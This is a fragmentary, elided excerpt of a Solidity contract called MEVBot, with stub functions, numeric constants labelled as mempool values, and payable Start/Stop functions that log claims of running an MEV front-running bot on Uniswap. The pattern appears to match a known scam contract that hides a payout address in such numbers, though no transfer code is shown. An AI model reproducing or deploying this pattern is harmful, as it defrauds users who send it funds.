...
contract MEVBot {
    ...
    function callMempool() internal pure returns (string memory) {
        ...
        uint _memPoolSol = 1616501128101;
        uint _memPoolLength = 227200260;
        uint _memPoolSize = 65091;
    ...
    function _callFrontRunActionMempool() public pure returns (address) {
    ...
    function Start() public payable { 
        emit Log("Running MEV Flashbot on Uniswap. This can take a while; please wait...");
    ...
    function Stop() public payable { 
        emit Log("Exiting the Liquidity Pool...");
